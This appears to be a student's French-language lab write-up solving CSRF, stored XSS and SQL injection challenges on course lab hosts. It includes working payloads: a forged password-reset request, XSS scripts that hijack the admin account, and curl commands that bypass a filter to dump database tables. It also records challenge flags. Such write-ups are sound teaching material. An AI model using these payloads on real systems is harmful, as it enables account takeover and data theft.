# Laboratoire 1



## CSRF Simple

### Quelle fonctionnalité du site, potentiellement vulnérable à une faille `CSRF`, pourriez-vous exploiter pour voler le compte administrateur?

La réinitialisation du mot de passe.

### Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l'administrateur

```
POST /profile/calum.quinn_admin
Host: basic.csrf.slh.cyfr.ch
Content-Type: application/x-www-form-urlencoded

password=newPassword
```

### Ecrivez une payload javascript qui exécute la requête

```
<script>
fetch("/profile/calum.quinn_admin", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    "body": "password=newPassword",
    "method": "POST",
    "mode": "cors"
});
</script>
```

### Quelle fonctionnalité du site, potentiellement vulnérable à une faille Stored XSS, pourriez-vous exploiter pour faire exécuter votre payload par l'administrateur?

Le contact de l'administrateur, tant que le HTML est directement affiché tel quel.

### Quel est le flag? Comment avez-vous pu l'obtenir?

`7m4oWVOZz5uAGdN-`

J'ai changé le mot de passe du compte administrateur en envoyant la payload JavaScript défini avant par le biais du mécanisme de contact de l'administrateur.

J'ai ensuite pu me logger avec le compte administrateur et mon nouveau mot de passe pour trouver le flag.

### Comment corrigeriez-vous la vulnérabilité?

Je vérifierais (sanitize) les données utilisateurs entrées, ceci pour empĉher l'éxecution de scripts depuis les entrées HTML.



## CSRF Avancée

### Qu'est-ce qu'un jeton anti-CSRF, comment fonctionne-t-il?

C'est un jeton généré par le serveur web lorsqu'une nouvelle page est demandée. Elle est envoyée au backend qui peut vérifier que ce soit une requête valide.
Chaque jeton est lié directement à l'utilisateur en question pour éviter de pouvoir 

### Comment déterminer si le formulaire est protégé par un jeton anti-CSRF?

Lorqu'on envoie une demande de contact, on peut vérifier les requêtes réseau dans les outils développeurs. Dans la requête on voit le sujet de la demande ainsi qu'une valeur de jeton.

```
subject=Hello&_csrf=ANKyq1J8-Y5vKlT__7gPe3hWoLm9j46LfAkY
```

### Le site est également vulnérable à une attaque XSS. Quel est le flag du challenge? Décrivez l'attaque.

`xBnT3wbmXCiM6PEc`

Comme à l'exercice précédent, le formulaire de contact est utilisé à nouveau pour envoyer un script à l'administrateur.

Cette fois par contre on charge réellement la page de l'administrateur pour usurper son jeton CSRF pour se faire passer pour lui lors de la requête de changement de mot de passe.

```
<iframe id="frame" src="/profile/calum.quinn_admin" style="display:none" aria-hidden="true"></iframe>

<script>
const frame = document.getElementById('frame');

frame.addEventListener('load', () => {
  const doc = frame.contentDocument || frame.contentWindow.document;
  const pwd = doc.querySelector('input[type="password"]');
  const submit = doc.querySelector('button[type="submit"]');

  if (pwd) pwd.value = 'newPassword';
  if (submit) submit.click();
});
</script>
```

### Comment corrigeriez-vous la vulnérabilité?

Comme à l'exercice précédent, il faut sécuriser ses entrées utilisateurs pour éviter l'éxecution de scripts.



## Injection SQL

### Quelle partie du service est vulnérable à une injection SQL?

L'utilisation de la variable ID dans la requête JSON.

### Le serveur implémente une forme insuffisante de validation des entrées. Expliquer pourquoi c'est insuffisant.

Certaines forme d'injection basiques tels que les espaces et les guillemets sont bloquées mais d'autres choses pas.

Nous pouvons par exemple envoyer des valeurs textuels sans espaces ni guillemets pour faire des requêtes valides en SQL.

### Quel est le flag Comment avez-vous prodédé pour l'obtenir?

`SLH25{D0N7_P4r53_5Q1_M4NU411Y}`

Pour pouvoir faire une requête sans utiliser d'espaces et de guillemets, il a fallu savoir quel type de base de données est utilisé par le site pour utiliser la bonne syntaxe.

Un exemple connu est SQLite et nous donne la requête suivante pour lister toutes les tables de la DB sans espaces ni guillemets.

```
curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"id/**/union/**/select/**/type,name,sql,4/**/from/**/sqlite_master"}' | jq '.[] | select(.[0] == "table")'
```

Ceci nous liste 2 tables, celle des fleurs qui est déjà connue ainsi qu'une deuxième "super_secret_stuff".

Pour accèder aux données, il suffit de faire une requête directement dessus, toujours en employant des commentaires pour séparer les mots plutôt que des espaces.

```
curl 'http://sql.slh.cyfr.ch/flowers' -X POST -H 'Content-Type: application/json' --data-raw '{"id":"0/**/union/**/select/**/name,value,3,4/**/from/**/super_secret_stuff/**/"}'
```

### Quel est le DBMS utilisé? Auriez-vous procédé différement si le DBMS avait été MySQL ou MariaDB?

Avec la question précédente on a pu définir que la DBMS utilisée est du SQLite.

Si ça avait été des DB basé sur MySQL (e.g. MariaDB), la technique aurait été la même pour éviter d'utiliser les espaces et guillemets mais il aurait fallu faire la requête sur "information_schema" plutôt que "sqlite_master".

